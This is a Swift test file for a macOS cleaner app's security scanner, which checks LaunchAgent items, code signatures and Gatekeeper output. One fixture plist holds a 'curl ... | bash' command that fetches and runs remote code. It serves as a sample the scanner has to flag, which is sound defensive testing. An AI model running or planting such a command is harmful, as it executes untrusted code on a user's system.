import Foundation
import Testing
@testable import CleanerCore

@Suite("Security scanner")
struct SecurityScannerTests {

    private func writePlist(_ fx: Fixture, _ name: String, _ dict: [String: Any]) throws {
        try fx.dir("LaunchAgents")
        let data = try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
        try data.write(to: fx.url("LaunchAgents/\(name)"))
    }

    private func makeScript(_ fx: Fixture, _ relative: String) throws -> String {
        let url = try fx.file(relative)
        try Data("#!/bin/sh\necho hi\n".utf8).write(to: url)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path(percentEncoded: false))
        return url.path(percentEncoded: false)
    }

    private func makeApp(_ fx: Fixture, _ name: String, bundleID: String) throws -> URL {
        let app = fx.url("Apps/\(name).app")
        let info: [String: Any] = ["CFBundleIdentifier": bundleID, "CFBundleExecutable": name, "CFBundleName": name]
        try fx.dir("Apps/\(name).app/Contents/MacOS")
        try PropertyListSerialization.data(fromPropertyList: info, format: .xml, options: 0)
            .write(to: app.appending(path: "Contents/Info.plist"))
        _ = try makeScript(fx, "Apps/\(name).app/Contents/MacOS/\(name)")
        return app
    }

    private func scanner(_ fx: Fixture, runner: CommandRunner = .unavailable) -> SecurityScanner {
        var s = SecurityScanner(
            launchFolders: [(fx.url("LaunchAgents"), .userAgent)],
            appFolders: [fx.url("Apps")],
            commandRunner: runner
        )
        // Fixtures live in $TMPDIR (/private/var/folders), which the real
        // scanner treats as suspicious. Keep the other locations.
        s.suspiciousLocations = SecurityScanner.temporaryPrefixes.filter { !$0.contains("/var/folders/") }
        return s
    }

    @Test func programsInTemporaryFolderAreSuspiciousByDefault() throws {
        let fx = try Fixture()
        let script = try makeScript(fx, "bin/tool.sh")
        let item = LaunchItem(plist: fx.url("a.plist"), scope: .userAgent, label: "com.example.a", program: script,
                              arguments: [], runAtLoad: true, keepAlive: false, isBundleProgram: false, isReadable: true)
        #expect(SecurityScanner.evaluate(item)?.severity == .suspicious)
    }

    @Test func flagsSuspiciousStartupItemsAndIgnoresGoodOnes() async throws {
        let fx = try Fixture()
        let script = try makeScript(fx, "bin/tool.sh")
        try writePlist(fx, "com.example.good.plist", ["Label": "com.example.good", "Program": "/bin/ls", "RunAtLoad": true])
        try writePlist(fx, "com.apple.thing.plist", ["Label": "com.apple.thing", "Program": "/private/tmp/x"])
        try writePlist(fx, "com.example.tmp.plist", ["Label": "com.example.tmp", "Program": "/private/tmp/.cache/agent"])
        try writePlist(fx, "com.example.curl.plist", [
            "Label": "com.example.curl",
            "ProgramArguments": ["/bin/bash", "-c", "curl -s https://example.invalid/p | bash"],
        ])
        try writePlist(fx, ".com.example.hidden.plist", ["Label": "com.example.hidden", "Program": "/bin/ls"])
        try writePlist(fx, "com.example.missing.plist", ["Label": "com.example.missing", "Program": fx.path("nope/agent")])
        try writePlist(fx, "com.example.unsigned.plist", ["Label": "com.example.unsigned", "Program": script])
        try writePlist(fx, "com.example.helper.plist", ["Label": "com.example.helper", "BundleProgram": "Contents/MacOS/helper"])
        try Data("not a plist".utf8).write(to: fx.url("LaunchAgents/com.example.broken.plist"))

        let report = await scanner(fx).scan()
        let byTitle = Dictionary(uniqueKeysWithValues: report.findings.map { ($0.title, $0) })

        #expect(report.launchItemsChecked == 9)
        #expect(byTitle["com.example.good"] == nil)
        #expect(byTitle["com.apple.thing"] == nil)
        #expect(byTitle["com.example.helper"] == nil)
        #expect(byTitle["com.example.tmp"]?.severity == .suspicious)
        #expect(byTitle["com.example.curl"]?.severity == .suspicious)
        #expect(byTitle["com.example.curl"]?.reasons.first?.contains("downloads") == true)
        #expect(byTitle["com.example.hidden"]?.severity == .suspicious)
        #expect(byTitle["com.example.missing"]?.severity == .review)
        #expect(byTitle["com.example.unsigned"]?.severity == .review)
        #expect(byTitle["com.example.unsigned"]?.signature == .unsigned)
        #expect(byTitle["com.example.broken"]?.severity == .review)
        #expect(report.threatCount == 3)
        #expect(report.findings.prefix(3).allSatisfy { $0.severity == .suspicious }, "Suspicious first")
    }

    @Test func scanNeverModifiesAnything() async throws {
        let fx = try Fixture()
        try writePlist(fx, "com.example.tmp.plist", ["Label": "com.example.tmp", "Program": "/private/tmp/agent"])
        _ = try makeApp(fx, "Thing", bundleID: "com.example.thing")
        let before = fx.treeSnapshot()
        _ = await scanner(fx).scan()
        #expect(fx.treeSnapshot() == before)
    }

    @Test func flagsUnsignedAppsButNotMacCleanerItself() async throws {
        let fx = try Fixture()
        _ = try makeApp(fx, "Unsigned", bundleID: "com.example.unsigned")
        _ = try makeApp(fx, "Mac Cleaner", bundleID: "io.github.maccleaner.app")

        let report = await scanner(fx).scan()

        #expect(report.appsChecked == 2)
        #expect(report.findings.map(\.title) == ["Unsigned"])
        #expect(report.findings.first?.severity == .review)
        #expect(report.threatCount == 0)
    }

    @Test func appleAppsAreNotFlagged() async throws {
        let fx = try Fixture()
        let finding = await scanner(fx).evaluateApp(URL(fileURLWithPath: "/System/Applications/Calculator.app"))
        #expect(finding == nil)
    }

    @Test func signatureCheckerRecognisesAppleUnsignedAndTampered() throws {
        let fx = try Fixture()
        #expect(SignatureChecker.status(of: URL(fileURLWithPath: "/bin/ls")) == .apple)
        #expect(SignatureChecker.status(of: URL(fileURLWithPath: try makeScript(fx, "s.sh"))) == .unsigned)

        // Copy an Apple binary into the fixture and flip one byte of code.
        var data = try Data(contentsOf: URL(fileURLWithPath: "/bin/ls"))
        data[data.count / 2] ^= 0xFF
        try data.write(to: fx.url("tampered"))
        guard case .invalid = SignatureChecker.status(of: fx.url("tampered")) else {
            Issue.record("Tampered binary must report a broken signature")
            return
        }
    }

    @Test func parsesGatekeeperOutput() async throws {
        let fx = try Fixture()
        let app = "/Applications/Example.app"
        let rejected = FakeCommands([
            "--assess --type execute -vv \(app)": CommandOutput(
                status: 3, stdout: Data(), stderr: Data("\(app): rejected\nsource=Unnotarized Developer ID\n".utf8)
            ),
        ])
        #expect(await scanner(fx, runner: rejected.runner).gatekeeperAssessment(URL(fileURLWithPath: app)) == .rejected("Unnotarized Developer ID"))

        let accepted = FakeCommands([
            "--assess --type execute -vv \(app)": CommandOutput(
                status: 0, stdout: Data(), stderr: Data("\(app): accepted\nsource=Notarized Developer ID\n".utf8)
            ),
        ])
        #expect(await scanner(fx, runner: accepted.runner).gatekeeperAssessment(URL(fileURLWithPath: app)) == .accepted("Notarized Developer ID"))
        #expect(await scanner(fx).gatekeeperAssessment(URL(fileURLWithPath: app)) == .unknown)
    }

    @Test func wordingNeverClaimsTheMacIsSafe() {
        let clean = SecurityReport(findings: [], launchItemsChecked: 10, appsChecked: 50)
        #expect(clean.headline == "No known threats found")
        for text in [clean.headline, SecurityReport.disclaimer] {
            #expect(!text.lowercased().contains("is safe"))
            #expect(!text.lowercased().contains("no malware"))
        }
    }
}
